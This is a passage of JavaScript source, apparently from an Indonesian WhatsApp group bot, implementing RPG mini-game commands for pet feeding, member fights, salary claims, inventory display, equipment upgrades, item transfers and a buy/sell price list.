let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
return [h, ' H ', m, ' M ', s, ' S'].map(v => v.toString().padStart(2, 0)).join('')
}
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}

let info = `
乂 List Pet:
🐈 • Cᴀᴛ
🐕 • Dᴏɢ
🐎 • Hᴏʀsᴇ
🦊 • Fᴏx
🤖 • Rᴏʙᴏ

*➠ Example:* ${command}fcat
`.trim()
let pesan = pickRandom(['ɴʏᴜᴍᴍᴍ~', 'ᴛʜᴀɴᴋs', 'ᴛʜᴀɴᴋʏᴏᴜ ^-^', '...', 'ᴛʜᴀɴᴋ ʏᴏᴜ~', 'ᴀʀɪɢᴀᴛᴏᴜ ^-^'])
let type = (args[0] || '').toLowerCase()
let emo = (type == 'fox' ? '🦊':'' || type == 'cat' ? '🐈':'' || type == 'dog' ? '🐕':'' || type == 'horse' ? '🐴':'' || type == 'robo'? '🤖':'' ) 
let user = db.data.users[m.sender]
let rubah = db.data.users[m.sender].fox
let kuda = db.data.users[m.sender].horse
let kucing = db.data.users[m.sender].cat
let anjing = db.data.users[m.sender].dog
let robot = db.data.users[m.sender].robo
switch (type) {
case 'fox':
if (rubah == 0) return qioreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (rubah == 10) return qioreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktur = (new Date - user.foxlastfeed)
let _waktur = (10000 - __waktur)
let waktur = clockString(_waktur)
if (new Date - user.foxlastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.foxexp += 20
user.foxlastfeed = new Date * 1
m.reply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (rubah > 0) {
let naiklvl = ((rubah * 100) - 1)
if (user.foxexp > naiklvl) {
user.fox += 1
user.foxexp -= (rubah * 100)
m.reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
break
//=================================================//
case 'cat':
if (kucing == 0) return qioreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kucing == 10) return qioreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktuc = (new Date - user.catlastfeed)
let _waktuc = (10000 - __waktuc)
let waktuc = clockString(_waktuc)
if (new Date - user.catlastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.catexp += 20
user.catlastfeed = new Date * 1
m.reply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)

if (kucing > 0) {
let naiklvl = ((kucing * 100) - 1)
if (user.catexp > naiklvl) {
user.cat += 1
user.catexp -= (kucing * 100)
m.reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuc}*`)
break
//=================================================//
case 'dog':
if (anjing == 0) return qioreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (anjing == 10) return qioreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktua = (new Date - user.doglastfeed)
let _waktua = (10000 - __waktua)
let waktua = clockString(_waktua)
if (new Date - user.doglastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.dogexp += 20
user.doglastfeed = new Date * 1
m.reply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (anjing > 0) {
let naiklvl = ((anjing * 100) - 1)
if (user.dogexp > naiklvl) {
user.dog += 1
user.dogexp -= (anjing * 100)
m.reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktua}*`)
break
//=================================================//
case 'horse':
if (kuda == 0) return qioreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kuda == 10) return qioreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __waktuk = (new Date - user.horselastfeed)
let _waktuk = (10000 - __waktuk)
let waktuk = clockString(_waktuk)
if (new Date - user.horselastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.horseexp += 20
user.horselastfeed = new Date * 1
m.reply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (kuda > 0) {
let naiklvl = ((kuda * 100) - 1)
if (user.horseexp > naiklvl) {
user.horse += 1
user.horseexp -= (kuda * 100)
m.reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktuk}*`)
break
//=================================================//
case 'robo':
if (robot == 0) return qioreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (robot == 10) return qioreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
let __wakturb = (new Date - user.robolastfeed)
let _wakturb = (10000 - __wakturb)
let wakturb = clockString(_wakturb)
if (new Date - user.robolastfeed > 10000) {
if (user.petfood > 0) {
user.petfood -= 1
user.roboexp += 20
user.robolastfeed = new Date * 1
m.reply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (robot > 0) {
let naiklvl = ((robot * 100) - 1)
if (user.roboexp > naiklvl) {
user.robo += 1
user.roboexp -= (robot * 100)
m.reply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else m.reply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${wakturb}*`)
break
default:
return m.reply(`${info}`)
}
}
break
//=================================================//
case 'fighting':
 case 'fight': {
 if (!isGroup) return qioreply(mess.ingroup)
qio.fight = qio.fight ? qio.fight: {}
let user = db.data.users[m.sender]
if (typeof qio.fight[m.sender] != "undefined" && qio.fight[m.sender] == true) return m.reply(`Kamu masih bertarung.`)
let users = participants.map(a => a.id)
var lawan
lawan = users[Math.floor(users.length * Math.random())]
while (typeof db.data.users[lawan] == "undefined" || lawan == m.sender) {
lawan = users[Math.floor(users.length * Math.random())]
}
m.reply(`*Kamu* (level ${user.level}) menantang *${qio.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
qio.fight[m.sender] = true
await delay(300000)
let kesempatan = []
for (let i = 0; i < user.level; i++) kesempatan.push(m.sender)
for (let i = 0; i < db.data.users[lawan].level; i++) kesempatan.push(lawan)
let pointPemain = 0
let pointLawan = 0
for (let i = 0; i < 10; i++) {
let unggul = getRandom(0, kesempatan.length - 1)
if (kesempatan[unggul] == m.sender) pointPemain += 1
else pointLawan += 1
}
if (pointPemain > pointLawan) {
let hadiah = (pointPemain - pointLawan) * 10000
user.money += hadiah
user.limit += 1
m.reply(`*${qio.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${qio.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${qio.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
m.reply(`*${qio.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${qio.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${qio.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
m.reply(`*${qio.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${qio.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete qio.fight[m.sender]
}
break
//=================================================//
case 'gajian': {
if (!isGroup) return qioreply(mess.ingroup)
function JaM(ms) {
let h = isNaN(ms) ? '60' : Math.floor(ms / 3600000) % 60
return [h].map(v => v.toString().padStart(2, 0) ).join(':')
}

function MeNit(ms) {
let m = isNaN(ms) ? '60' : Math.floor(ms / 60000) % 60
return [m].map(v => v.toString().padStart(2, 0) ).join(':')
}

function DeTik(ms) {
let s = isNaN(ms) ? '60' : Math.floor(ms / 1000) % 60
return [s].map(v => v.toString().padStart(2, 0) ).join(':')
}

let LastClaim = db.data.users[m.sender].lastclaim
let cdm = `${MeNit(new Date - LastClaim)}`
let cds = `${DeTik(new Date - LastClaim)}`
let cd1 = Math.ceil(44 - cdm)
let cd2 = Math.ceil(59 - cds)
if (new Date - db.data.users[m.sender].lastclaim > 2700000) {
db.data.users[m.sender].money += 50000
db.data.users[m.sender].exp += 100
qioreply('Nih gaji lu +Rp50000')
db.data.users[m.sender].lastclaim = new Date * 1
} else return m.reply(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break
//=================================================//
case 'me':
case 'inventory': {
if (!isGroup) return qioreply(mess.ingroup)
let inventory = {
others: {
joinlimit: true,
health: true,
money: true,
chip: true,
exp: true,
},
items: {
bibitanggur: true,
bibitmangga: true,
bibitpisang: true,
bibitapel: true,
bibitjeruk: true,
anggur: true,
mangga: true,
pisang: true,
apel: true,
jeruk: true,
potion: true,
trash: true,
wood: true,
rock: true,
string: true,
emerald: true,
diamond: true,
gold: true,
iron: true,
umpan: true,
upgrader: true,
pet: true,
petfood: true,
},
durabi: {
sworddurability: true,
pickaxedurability: true,
fishingroddurability: true,
armordurability: true,
},
tools: {
armor: {
'0': '❌',
'1': 'Leather Armor',
'2': 'Iron Armor',
'3': 'Gold Armor',
'4': 'Diamond Armor',
'5': 'Emerald Armor',
'6': 'Crystal Armor',
'7': 'Obsidian Armor',
'8': 'Netherite Armor',
'9': 'Wither Armor',
'10': 'Dragon Armor',
'11': 'Hacker Armor'
},
sword: {
'0': '❌',
'1': 'Wooden Sword',
'2': 'Stone Sword',
'3': 'Iron Sword',
'4': 'Gold Sword',
'5': 'Copper Sword',
'6': 'Diamond Sword',
'7': 'Emerald Sword',
'8': 'Obsidian Sword',
'9': 'Netherite Sword',
'10': 'Samurai Slayer Green Sword',
'11': 'Hacker Sword'
},
pickaxe: {
'0': '❌',
'1': 'Wooden Pickaxe',
'2': 'Stone Pickaxe',
'3': 'Iron Pickaxe',
'4': 'Gold Pickaxe',
'5': 'Copper Pickaxe',
'6': 'Diamond Pickaxe',
'7': 'Emerlad Pickaxe',
'8': 'Crystal Pickaxe',
'9': 'Obsidian Pickaxe',
'10': 'Netherite Pickaxe',
'11': 'Hacker Pickaxe'
},
fishingrod: {
'0': '❌',
'1': 'Wooden Fishingrod',
'2': 'Stone Fishingrod',
'3': 'Iron Fishingrod',
'4': 'Gold Fishingrod',
'5': 'Copper Fishingrod',
'6': 'Diamond Fishingrod',
'7': 'Emerald Fishingrod',
'8': 'Crystal Fishingrod',
'9': 'Obsidian Fishingrod',
'10': 'God Fishingrod',
'11': 'Hacker Fishingrod'
 }
},
crates: {
common: true,
uncommon: true,
mythic: true,
legendary: true,
},
pets: {
horse: 10,
cat: 10,
fox: 10,
dog: 10,
robo: 10,
},
cooldowns: {}
}

let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? qio.user.jid : m.sender
let user = db.data.users[who]

if (!(who in db.data.users)) return m.reply(`User ${who} not in database`)

let sortedlevel = Object.entries(db.data.users).sort((a, b) => b[1].level - a[1].level)
let userslevel = sortedlevel.map(v => v[0])
let sortedchip = Object.entries(db.data.users).sort((a, b) => b[1].chip - a[1].chip)
let userschip = sortedchip.map(v => v[0])
let sortedmoney = Object.entries(db.data.users).sort((a, b) => b[1].money - a[1].money)
let usersmoney = sortedmoney.map(v => v[0])
let sorteddiamond = Object.entries(db.data.users).sort((a, b) => b[1].diamond - a[1].diamond)
let usersdiamond = sorteddiamond.map(v => v[0])
let sortedbank = Object.entries(db.data.users).sort((a, b) => b[1].bank - a[1].bank)
let usersbank = sortedbank.map(v => v[0])
let sortedgold = Object.entries(db.data.users).sort((a, b) => b[1].gold - a[1].gold)
let usersgold = sortedgold.map(v => v[0])

let isMods = [qio.decodeJid(qio.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isDeveloper = m.fromMe || isMods || [qio.decodeJid(qio.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.ownerTime < 0

let limit = isPrems ? 'Unlimited' : user.limit
let tools = Object.keys(inventory.tools).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${typeof inventory.tools[v] === 'object' ? inventory.tools[v][user[v]?.toString()] : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
let items = Object.keys(inventory.items).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let dura = Object.keys(inventory.durabi).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let crates = Object.keys(inventory.crates).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v]}`).filter(v => v).join('\n').trim()
let pets = Object.keys(inventory.pets).map(v => user[v] && `*${global.rpg.emoticon(v)} ${v}:* ${user[v] >= inventory.pets[v] ? 'Max Levels' : `Level(s) ${user[v]}`}`).filter(v => v).join('\n').trim()
let cooldowns = Object.entries(inventory.cooldowns).map(([cd, { name, time }]) => cd in user && `*✧ ${name}*: ${new Date() - user[cd] >= time ? '✅' : '❌'}`).filter(v => v).join('\n').trim()

let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : qio.getName(who)}* ${user.level ? `
➠ ${global.rpg.emoticon('level')} level: ${user.level}` : ''} ${user.limit ? `
➠ ${global.rpg.emoticon('limit')} limit: ${limit}` : ''}
${Object.keys(inventory.others).map(v => user[v] && `➠ ${global.rpg.emoticon(v)} ${v}: ${user[v]}`).filter(v => v).join('\n')} ${tools ? `

*ʟɪꜱᴛ ᴛᴏᴏʟs* :
${tools}` : ''}${items ? `

*ʟɪꜱᴛ ɪᴛᴇᴍs* :
${items}` : ''}${crates ? `

*ʟɪꜱᴛ ᴄʀᴀᴛᴇs* :
${crates}` : ''}${pets ? `

*ʟɪꜱᴛ ᴩᴇᴛs* :
${pets}` : ''}${cooldowns ? `

*ʟɪꜱᴛ ᴀʀᴄʜɪᴇᴠᴇᴍᴇɴᴛ* :
${global.rpg.emoticon('chip')} ᴛᴏᴘ ᴄʜɪᴘ *${userschip.indexOf(who) + 1}* ᴅᴀʀɪ *${userschip.length}*
${global.rpg.emoticon('money')} ᴛᴏᴘ ᴍᴏɴᴇʏ *${usersmoney.indexOf(who) + 1}* ᴅᴀʀɪ *${usersmoney.length}*
${global.rpg.emoticon('bank')} ᴛᴏᴘ ʙᴀɴᴋ *${usersbank.indexOf(who) + 1}* ᴅᴀʀɪ *${usersbank.length}*
${global.rpg.emoticon('level')} ᴛᴏᴘ ʟᴇᴠᴇʟ *${userslevel.indexOf(who) + 1}* ᴅᴀʀɪ *${userslevel.length}*
${global.rpg.emoticon('diamond')} ᴛᴏᴘ ᴅɪᴀᴍᴏɴᴅ *${usersdiamond.indexOf(who) + 1}* ᴅᴀʀɪ *${usersdiamond.length}*
${global.rpg.emoticon('gold')} ᴛᴏᴘ ɢᴏʟᴅ *${usersgold.indexOf(who) + 1}* ᴅᴀʀɪ *${usersgold.length}*

♻️ *ᴄᴏʟʟᴇᴄᴛ ʀᴇᴡᴀʀᴅs* :
${cooldowns}` : ''}
*✧ dungeon: ${user.lastdungeon == 0 ? '✅': '❌'}*
*✧ mining: ${user.lastmining == 0 ? '✅': '❌'}*
`.trim()

m.reply(`${caption}`)
}
break
//=================================================//
case 'upgrade': {
if (!isGroup) return qioreply(mess.ingroup)
let user = db.data.users[m.sender]
let wood = user.wood * 1
let rock = user.rock * 1
let string = user.string * 1
let money = user.money * 1
let iron = user.iron * 1
let fishingrod = user.fishingrod * 1
let pickaxe = user.pickaxe * 1
let sword = user.sword * 1
let diamond = user.diamond * 1
let emerald = user.emerald * 1
let armor = user.armor * 1
let atm = user.atm
let type = (args[0] || '').toLowerCase()
let prefix = command

let teks = `█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█
█▀▀▀▀█▀▀▀▀█▀▀▀▀█
█────█────█────█
█▄▄▄▄█▄▄▄▄█▄▄▄▄█

Gunakan Format *${command} [type]*
contoh *${command} fishingRod*

*📌List yang Bisa Di Upgrade*
${rpg.emoticon('fishingrod')}FishingRod
${rpg.emoticon('pickaxe')}Pickaxe
${rpg.emoticon('sword')}Sword
${rpg.emoticon('armor')}Armor
${rpg.emoticon('atm')}Atm
`.trim()

switch (type) {
case 'fishingrod':
if (fishingrod == 0) {
let lmao = `anda belum memiliki *🎣FishingRod*
untuk mendapatkannya ketik *${command}craft fishingrod*`
return m.reply(`${lmao}`)
}
if (fishingrod > 9) return m.reply(`*${rpg.emoticon('fishingrod')}FishingRod* kamu sudah level max`)
let _wood = fishingrod * 100
let _string = fishingrod * 100
let _money = fishingrod * 1000000
if (wood < _wood || string < _string || money < _money) return m.reply(`Material kamu kurang!!${wood < _wood ? `\n${rpg.emoticon('wood')}wood Kamu Kurang *${_wood - wood}*` : ''}${string < _string ? `\n${rpg.emoticon('string')}String Kamu Kurang *${_string - string}*` : ''}${user.money < _money ? `\n${rpg.emoticon('money')}Uang Kamu Kurang *${_money - money}*` : ''}`)
user.fishingrod += 1
user.wood -= _wood * 1
user.string -= _string * 1
user.money -= _money * 1
user.fishingroddurability = 0 
user.fishingroddurability += fishingrod * 50
m.reply(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
break
//=================================================//
case 'pickaxe':
if (pickaxe == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('pickaxe')}Pickaxe*
untuk memilikinya ketik *${command}craft Pickaxe*`
return m.reply(`${lmao}`)
}
if (pickaxe > 9) return m.reply(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
let __rock = pickaxe * 250
let __wood = pickaxe * 150
let __money = pickaxe * 1500000
if (rock < __rock || wood < __wood || money < __money) return m.reply(`
Material Anda Kurang!!
${rock < __rock ? `\n${rpg.emoticon('rock')}rock kamu kurang *${__rock - rock}*` : ''}${wood < __wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${__wood - wood}*` : ''}${money < __money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${__money - money}*` : ''}`)
user.pickaxe += 1
user.wood -= __wood * 1
user.rock -= __rock * 1
user.money -= __money * 1
user.pickaxedurability = 0
user.pickaxedurability += pickaxe * 50
m.reply(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
break
//=================================================//
case 'sword':
if (sword == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('sword')}Sword*
untuk memilikinya ketik *${command}craft sword*`
return m.reply(`${lmao}`)
}
if (sword > 9) return m.reply(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
let _iron = sword * 250
let ___wood = sword * 150
let ___money = sword * 1000000
if (iron < _iron || wood < ___wood || money < ___money) return m.reply(`
Material Anda Kurang!!
${iron < _iron ? `\n${rpg.emoticon('iron')}Iron kamu kurang *${_iron - iron}*` : ''}${wood < ___wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${___wood - wood}*` : ''}${money < ___money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${___money - money}*` : ''}`)
user.sword += 1
user.iron -= _iron * 1
user.wood -= ___wood * 1
user.money -= ___money * 1
user.sworddurability = 0 
user.sworddurability += sword * 50 
m.reply(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
break
//=================================================//
case 'armor':
if (armor == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('armor')}Armor*
untuk memilikinya ketik *${command}craft armor*`
return m.reply(`${lmao}`)
}
if (armor > 9) return m.reply(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
let _diamond = armor * 5
let ____wood = armor * 150
let ____money = armor * 1000000
if (diamond < _diamond || wood < ____wood || money < ____money) return m.reply(`
Material Anda Kurang!!
${diamond < _diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${_diamond - diamond}*` : ''}${wood < ____wood ? `\n${rpg.emoticon('wood')}wood kamu kurang *${____wood - wood}*` : ''}${money < ____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${____money - money}*` : ''}`)
user.armor += 1
user.diamond -= _diamond * 1
user.wood -= ____wood * 1
user.money -= ____money * 1
user.armordurability = 0 
user.armordurability += sword * 50 
m.reply(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
break
//=================================================//
case 'atm':
if (atm == 0) {
let lmao = `anda belum memiliki *${rpg.emoticon('atm')}Atm*
untuk memilikinya ketik *${command}craft atm*`
return m.reply(`${lmao}`)
}
if (atm > 999) return m.reply(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
let __diamond = atm * 3
let _emerald = atm * 5
let _____money = atm * 10000
if (diamond < __diamond || emerald < _emerald || money < _____money) return m.reply(`
Material Anda Kurang!!
${diamond < __diamond ? `\n${rpg.emoticon('diamond')}Diamond kamu kurang *${__diamond - diamond}*` : ''}${emerald < _emerald ? `\n${rpg.emoticon('emerald')}Emerald kamu kurang *${_emerald - emerald}*` : ''}${money < _____money ? `\n${rpg.emoticon('money')}Uang kamu kurang *${_____money - money}*` : ''}`)
user.atm += 1
user.diamond -= __diamond * 1
user.emerald -= _emerald * 1
user.money -= _____money * 1
user.fullatm = 0 
user.fullatm += atm * 500000000
m.reply(`Succes mengupgrade *${rpg.emoticon('atm')}Atm*`)
break
default :
return m.reply(`${teks}`)
}
}
break
//=================================================//
case 'transfer': {
if (!isGroup) return qioreply(mess.ingroup)
function special(type) {
let b = type.toLowerCase()
let special = (['common', 'uncommon', 'mythic', 'legendary', 'pet'].includes(b) ? ' Crate' : '')
return special
}

function isNumber(x) {
return !isNaN(x)
}
const items = [
'money', 'bank', 'potion', 'trash', 'wood',
'rock', 'string', 'petFood', 'emerald',
'diamond', 'gold', 'iron', 'common',
'uncommon', 'mythic', 'legendary', 'pet', 'chip', 
'anggur', 'apel', 'jeruk', 'mangga', 'pisang', 
'bibitanggur', 'bibitapel', 'bibitjeruk', 'bibitmangga', 'bibitpisang',
]
let user = db.data.users[m.sender]
const item = items.filter(v => v in user && typeof user[v] == 'number')
let lol = `Use format ${command} [type] [value] [number]
example ${command} money 9999 @621927237001

📍 Transferable items
${item.map(v => `${rpg.emoticon(v)}${v}`.trim()).join('\n')}
`.trim()
const type = (args[0] || '').toLowerCase()
if (!item.includes(type)) return qioreply(lol)
const count = Math.min(Number.MAX_SAFE_INTEGER, Math.max(1, (isNumber(args[1]) ? parseInt(args[1]) : 1))) * 1
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : args[2] ? (args[2].replace(/[@ .+-]/g, '') + '@s.whatsapp.net') : ''
let _user = db.data.users[who]
if (!who) return qioreply('Tag salah satu, atau ketik Nomernya!!')
if (!(who in db.data.users)) return m.reply(`User ${who} not in database`)
if (user[type] * 1 < count) return m.reply(`Your *${rpg.emoticon(type)}${type}${special(type)}* is less *${count - user[type]}*`)
let previous = user[type] * 1
let _previous = _user[type] * 1
user[type] -= count * 1
_user[type] += count * 1
if (previous > user[type] * 1 && _previous < _user[type] * 1) m.reply(`*––––––『 𝚃𝚁𝙰𝙽𝚂𝙵𝙴𝚁 』––––––*\n*📊 Status:* Succes\n*🗂️ Type:* ${type}${special(type)} ${rpg.emoticon(type)}\n*🧮 Count:* ${count}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
else {
user[type] = previous
_user[type] = _previous
m.reply(`*––––––『 TRANSFER 』––––––*\n*📊 Status:* Failted\n*📍 Item:* ${count} ${rpg.emoticon(type)}${type}${special(type)}\n*📨 To:* @${(who || '').replace(/@s\.whatsapp\.net/g, '')}`, null, { mentions: [who] })
}
}
break
//=================================================//
case 'buy': {
if (!isGroup) return qioreply(mess.ingroup)
function isNumber(number) {
if (!number) return number
number = parseInt(number)
return typeof number == 'number' && !isNaN(number)
}

function capitalize(word) {
return word.charAt(0).toUpperCase() + word.substr(1)
}
const items = {
buy: {
limit: {
exp: 9999
},
chip: {
money: 1000000
},
exp: {
money: 1000
},
potion: {
money: 1250
},
trash: {
money: 40
},
wood: {
money: 700
},
rock: {
money: 850
},
string: {
money: 400
},
iron: { 
money: 3000
},
diamond: {
money: 500000
},
emerald: {
money: 100000
},
gold: {
money: 100000
},
common: {
money: 2000
},
uncommon: {
money: 20000
},
mythic: {
money: 75000
},
legendary: {
money: 200000
},
petfood: {
money: 3500
},
pet: {
money: 120000
},
anggur: {
money: 2000
},
apel: {
money: 2000
},
jeruk: {
money: 2000
},
mangga: {
money: 2000
},
pisang: {
money: 2000
},
bibitanggur: {
money: 2000
},
bibitapel: {
money: 2000
},
bibitjeruk: {
money: 2000
},
bibitmangga: {
money: 2000
},
bibitpisang: {
money: 2000
},
umpan: {
money: 5000
} 
},
sell: {
limit: {
exp: 999
},
exp: {
money: 1
},
chip: {
money: 1000000
},
potion: {
money: 625
},
trash: {
money: 20
},
wood: {
money: 350
},
rock: {
money: 425
},
string: {
money: 200
},
iron: { 
money: 1500
},
diamond: {
money: 250000
},
emerald: {
money: 50000
},
gold: {
money: 50000
},
common: {
money: 1000
},
uncommon: {
money: 10000
},
mythic: {
money: 37500
},
legendary: {
money: 100000
},
petfood: {
money: 1750
},
pet: {
money: 60000
},
anggur: {
money: 1000
},
apel: {
money: 1000
},
jeruk: {
money: 1000
},
mangga: {
money: 1000
},
pisang: {
money: 1000
},
bibitanggur: {
money: 1000
},
bibitapel: {
money: 1000
},
bibitjeruk: {
money: 1000
},
bibitmangga: {
money: 1000
},
bibitpisang: {
money: 1000
},
umpan: {
money: 2500
}
}
}

const item = (args[0] || '').toLowerCase()
if (!item.match('limit') && db.chats[m.chat].rpg == false && isGroup) return dfail('rpg', m, qio)
let user = db.data.users[m.sender]
const listItems = Object.fromEntries(Object.entries(items[command.toLowerCase()]).filter(([v]) => v && v in user))
let text = ''
let footer = ''
let image = ''
let buttons = ''
text = (command.toLowerCase() == 'buy' ?
(`
*${decor.htki} 𝙱𝚄𝚈𝙸𝙽𝙶 ${decor.htka}*
`.trim()) : 
(`
*${decor.htki} 𝚂𝙴𝙻𝙻𝙸𝙽𝙶 ${decor.htka}*
`.trim())
)
footer = (command.toLowerCase() == 'buy' ?
(`
🛒 List Items :
${Object.keys(listItems).map((v) => {
